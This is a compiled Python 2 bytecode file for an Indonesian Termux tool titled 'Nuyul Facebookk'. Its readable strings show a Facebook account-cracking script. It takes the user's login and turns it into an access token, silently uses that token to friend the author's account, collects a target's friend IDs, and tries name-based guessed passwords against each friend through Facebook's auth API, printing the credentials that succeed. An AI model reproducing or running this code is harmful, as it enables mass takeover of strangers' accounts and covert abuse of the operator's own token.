ó
¼¨^c           @   s  d  d l  Z  d  d l m Z d  d l m Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l m Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d Z d   Z g  Z g  a g  a g  Z g  Z g  Z d   Z e d k re   n  d S(	   iÿÿÿÿN(   t   BeautifulSoup(   t   ConnectionError(   t
   ThreadPoolsº   
	        [========================]
		[   Nuyul Facebookk om   ]
		[========================]
		     [4mDeveloper Khazul[0m

	   [32;5m[4mhttps://github.com/termuxofficial-term[0m
c       	   C   s  y  t  d d  j   }  t   Wnlt t f k
 rt j d  t j d  t GHd GHt d  } t d  } d } i | d	 6| d
 6} t	 j
   ñ} yË| j |  | j | d | } | j d  } t | j d  } | j d  }	 t |	  d k rLy d | d | d }
 i d d 6d d 6| d	 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$  } | j |
  | j   }	 | j i |	 d% 6 d& } t	 j | d' | } t j | j  } t  d d(  } | j | d)  | j   Wn t k
 rd* GHn Xd+ GHt	 j d, | d)  t j d-  t   n d. GHt j d/  t   Wn t	 j j k
 rd0 GHn XWd  QXn Xd  S(1   Ns	   token.txtt   rsL   pip2 install emoji && pip2 install requests && pip2 install bs4 &> /dev/nullt   clears%   [4mLogin akun facebook om dulu:[0m
s   Mail: s
   Password: s5   https://m.facebook.com/login/?next&ref=dbl&fl&refid=8t   emailt   passt   datas   https://m.facebook.com/home.phps   html.parsert   titles   <title>Facebook</title>sG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokens   Akun anda checkpoints   Login suksessM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s`   termux-open-url https://wa.me/601136956558?text=Halo%2C%20admin%20saya%20pengguna%20tool%20mimins   Password atau email salahi   s   Jaringan kamu buruk, coba lagi(   t   opent   readt   hackt   KeyErrort   IOErrort   ost   systemt   logot	   raw_inputt   requestst   Sessiont   gett   postR    t   contentt   findt   strt   hashlibt   newt   updatet	   hexdigestt   jsont   loadst   textt   writet   closet   timet   sleept   logint
   exceptionsR   (   t   tokent   Emailt   Passwordt   urlR   t   cR   t   bt   soupt   aR   t   xt   zt   khaz(    (    s   face.pyR8      s\    
S	
c          C   s»  y t  d d  j   a Wn t k
 r1 d GHn Xt j d  t GHt d  }  y> t j	 d |  d t  } t
 j | j  } d | d	 GHWn t k
 r­ d
 GHt   n Xd GHyW t j	 d |  d t  } t
 j | j  } x# | d D] } t j | d  qî WWn t j j k
 r(d GHn Xd j t t t    GHd GHd t j d  GHd GHd   } t d  } | j | t  d GHy t d  t   Wn t k
 r¶d GHn Xd  S(   Ns	   token.txtR   s   File token tidak ada!R   s   
ID teman: s   https://graph.facebook.com/s   ?access_token=s   Retas dari: t   names   Teman tidak adas   Mengambil id teman ...s   /friends?access_token=R   t   ids   Jaringan kamu buruk, coba lagis   Total id: {}s
   Crack ...
s4   [36;5m[4mSabar om, orang sabar disayang janda[0m s   :grinning_face_with_big_eyes:t    c         S   s§  |  } yt  j d | d t  } t j | j  } | d d } t j d | d | d  } t j |  } d | k r³ d GHd GHd | GHd | GHd GHt	 j
 | |  nåd | d k rø d GHd GHd | GHd | GHd GHt j
 | |  n | d d } t j d | d | d  } t j |  } d | k rud GHd GHd | GHd | GHd GHt	 j
 | |  n#d | d k rºd GHd GHd | GHd | GHd GHt j
 | |  nÞ| d d } t j d | d | d  } t j |  } d | k rht  j d | d | d  }	 t j |	 j  }
 d GHd GHd | GHd | GHd  GHt	 j
 | |  n0d | d k r­d! GHd GHd | GHd | GHd" GHt j
 | |  në d# } t j d | d | d  } t j |  } d | k rSt  j d | d | d  }	 t j |	 j  }
 d$ GHd GHd | GHd | GHd% GHt	 j
 | |  nE d | d k rd& GHd GHd | GHd | GHd' GHt j
 | |  n  Wn n Xd  S((   Ns   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R   t   =i   s   => status [[32;5mOK[0m]
s   => Email	: s   => Passwd	: s   www.facebook.comt	   error_msgs   => status [[32;5mOK[0m]t   12345t	   last_names   ?access_token=s   => status [[33;5mCP[0m]t	   sayang123t   sayangku123s   ===============s   ===============s   ===============s   ===============s   ===============s   ===============s   ===============s   ===============s   ===============s   ===============s   ===============s   ===============(   RN   RO   s   ===============s   ===============s   ===============s   ===============(   R&   R(   R:   R1   R2   R3   t   urllib2t   urlopent   loadt   okst   appendt   cekpoint(   t   argt   userRA   R?   t   pass1R   t   qt   pass2t   pass3RB   RC   t   pass5(    (    s   face.pyt   mains   s    																i   RJ   i   s   
Enter untuk hack ulang s   GoodBye njeng...s   ===============(   R   R   R:   t   OSErrorR"   R#   R$   R%   R&   R(   R1   R2   R3   R    t   exitRF   RT   R9   R   R   R,   t   lent   emojit   emojizeR   t   mapR8   t   KeyboardInterrupt(   t   idtt   jokt   opR   RC   t   iR]   t   p(    (    s   face.pyR   U   sF    			^
t   __main__(   R&   t   bs4R    t   requests.exceptionsR   R6   R"   t   sysR-   R1   t	   threadingt   multiprocessing.poolR   RP   t   randomt   datetimet	   cookielibRa   R$   R8   t   threadsRU   RS   RF   t   idfromtemant   idtemanR   t   __name__(    (    (    s   face.pyt   <module>   s0   	6	